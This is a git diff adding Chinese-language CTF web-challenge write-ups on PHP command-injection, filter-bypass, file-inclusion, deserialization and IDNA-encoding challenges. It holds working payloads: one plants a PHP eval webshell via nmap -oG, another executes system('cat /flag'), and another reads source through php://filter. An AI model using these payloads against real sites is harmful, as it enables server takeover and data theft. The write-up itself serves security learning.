@@ -3045,12 +3045,31 @@ if(!isset($_GET['host'])) {
 
 https://blog.csdn.net/qq_26406447/article/details/100711933
 
-[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)
+
+
+传递一个 `host`参数，经过两个函数 `escapeshellarg` 、`escapeshellcmd`的处理
+
+[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)，这个文章里介绍两个函数一起用会引发问题
+
+> 1. 传入的参数是：172.17.0.2' -v -d a=1经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+> 2. 经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：反斜线（\）会在以下字符之前插入： `&#;`|*?~<>^()[]{}$\`, `\x0A` 和 `\xFF`。 `'` 和 `"` 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符都会被空格代替。
+> 3. 最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
+
+nmap工具中有一个参数是可以创建文件的 `-oG`,可以实现将命令和结果写到文件，payload
 
 ```
 ?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
 ?host=\' <?php @eval($_POST["hack"]);?> -oG hack.php \' //escapeshellarg()执行
+?host=''\\'' \<\?php \@eval\(\$_POST\["hack"\]\);\?\> -oG hack.php ''\\''
 ```
+
+成功把hack.php文件传到服务器，用蚁剑连接一句话木马文件即可。
+
+![image-20210526125439243](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526125439243.png)
+
+![image-20210526125407846](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526125407846.png)
+
+
 
 ### [GXYCTF2019]BabyUpload
 
@@ -3072,7 +3091,7 @@ https://blog.csdn.net/qq_26406447/article/details/100711933
 
 ![image-20210521205547451](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205547451.png)
 
-不是base64、base32编码，不是md5和rot13。好像并不能还原这些编码，并且这些编码后的代码也能正确执行，看了别人的WP，写python脚本来找含有shell漏洞的PHP文件。
+不是base64、base32编码，不是md5和rot13。好像并不能还原这些编码，并且这些编码后的代码也能正确执行，看了别人的WP，写python脚本来找含有get或者post请求漏洞的PHP文件。
 
 ~~~python
 import os
@@ -3159,7 +3178,7 @@ include "flag.php";
 echo "flag在哪里呢？<br>";
 if(isset($_GET['exp'])){
     if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
-        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {//(?R)表示递归
             if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                 // echo $_GET['exp'];
                 @eval($_GET['exp']);
@@ -3804,3 +3823,231 @@ payload
 
 ![image-20210525201813511](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525201813511.png)
 
+### [CISCN 2019 初赛]Love Math
+
+~~~php
+ <?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+
+~~~
+
+看完代码没有思路，看看别人的WP,利用的是进制之间的转换构造函数
+
+~~~
+c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
+~~~
+
+### [BSidesCF 2020]Had a bad day
+
+![image-20210526134522215](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526134522215.png)
+
+扫描目录发现了flag.php文件，但是页面是空白，估计是想办法利用漏洞读取源码
+
+利用`filter`伪协议，获取了index.php的源码
+
+![image-20210526135843834](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526135843834.png)
+
+~~~php
+ <?php
+	$file = $_GET['category'];
+
+	if(isset($file))
+	{
+		if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+			include ($file . '.php');
+		}
+		else{
+			echo "Sorry, we currently only support woofers and meowers.";
+		}
+	 }
+ ?>
+			
+~~~
+
+传入的`category`需要有`woofers`,`meowers`,`index`才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php
+ 尝试直接读取`/index.php?category=woofers../../flag`
+
+![image-20210526141802506](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526141802506.png)
+
+出现了别的内容，包含成功了`flag.php`，但是这里也说了flag需要读取
+利用`php://filter`伪协议可以套一层协议读取`flag.php`
+`/index.php?category=php://filter/convert.base64-encode/index/resource=flag`
+套一个字符index符合条件并且传入flag，读取flag.php
+
+![image-20210526141642703](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526141642703.png)
+
+成功获得flag值：
+
+![image-20210526142129672](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526142129672.png)
+
+
+
+### [ASIS 2019]Unicorn shop
+
+![image-20210526142919805](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526142919805.png)
+
+抓包发现商品的价格做了限制，只允许输入一个字符
+
+![image-20210526143542181](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526143542181.png)
+
+如果只输入id,不输入price还会报错
+
+![image-20210526144048218](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526144048218.png)
+
+提示需要一个single Unicode字符，而且只允许输入一个字符只能买1，2，3号马，买不了4号马，那么很显然，买到这个4号马，就能得到flag！
+
+源码提示UTF-8很重要，这里需要了解下UTF-8是什么类型编码
+ 得到思路，利用Unicode字符中的一些特殊字符来代替输入的价格，从而得到flag
+
+> https://www.compart.com/en/unicode/
+>  这个网站有很全的Unicode字符
+
+![image-20210526145136714](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526145136714.png)
+
+选择一个大于1337的，复制他的utf-8的编码，并把0x改为%，传输即可
+
+![image-20210526145429829](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526145429829.png)
+
+### [安洵杯 2019]easy_serialize_php
+
+~~~php
+ <?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';//用 | 将一维数组的值连接为一个字符串。
+    return preg_replace($filter,'',$img);
+}
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);//变量覆盖post传递_SESSION的值
+
+if(!$function){
+    echo '<a href="index.php?f=highlight_file">source_code</a>';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info); //反序列化
+    echo file_get_contents(base64_decode($userinfo['img']));
+} 
+~~~
+
+~~~
+$userinfo['img']=ZDBnM19mMWFnLnBocA==
+~~~
+
+在构造假的序列化字符串的时候，_SESSION里面的键值对必须为三对，因为\_SESSION中有 `user function img`这三个键
+
+![image-20210527092136966](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210527092136966.png)
+
+
+
+
+
+### [SUCTF 2019]Pythonginx
+
+~~~python
+ @app.route('/getUrl', methods=['GET', 'POST'])
+def getUrl():
+    url = request.args.get("url")
+    host = parse.urlparse(url).hostname #获取请求主机名
+    if host == 'suctf.cc':
+        return "我扌 your problem? 111"
+    parts = list(urlsplit(url)) #拆分url
+    host = parts[1] #获得hostname:port
+    if host == 'suctf.cc':
+        return "我扌 your problem? 222 " + host
+    newhost = []
+    for h in host.split('.'): #使用. 分割host
+        newhost.append(h.encode('idna').decode('utf-8'))//漏洞，是Unicode编码的字符等同与utf-8
+    parts[1] = '.'.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(' ')[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == 'suctf.cc':
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return "我扌 your problem? 333"
+~~~
+
+注释中还有两句提示
+
+![image-20210527100934258](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210527100934258.png)
+
+本题考的是Unicode编码
+
+> ℆这个字符,如果使用python3进行idna编码的话
+> print('℆'.encode('idna'))
+> 结果
+> b'c/u'
+> 如果再使用utf-8进行解码的话
+> print(b'c/u'.decode('utf-8'))
+> 结果
+> c/u
+> 通过这种方法可以绕过网站的一些过滤字符
+
+
+
+
+
+
+
+
+
+**nginx的信息**
+
+> ngnix服务器配置目录
+> 配置文件存放目录：/etc/nginx
+> 主配置文件：/etc/nginx/conf/nginx.conf
+> 管理脚本：/usr/lib64/systemd/system/nginx.service
+> 模块：/usr/lisb64/nginx/modules
+> 应用程序：/usr/sbin/nginx
+> 程序默认存放位置：/usr/share/nginx/html
+> 日志默认存放位置：/var/log/nginx
+> 配置文件目录为：/usr/local/nginx/conf/nginx.conf
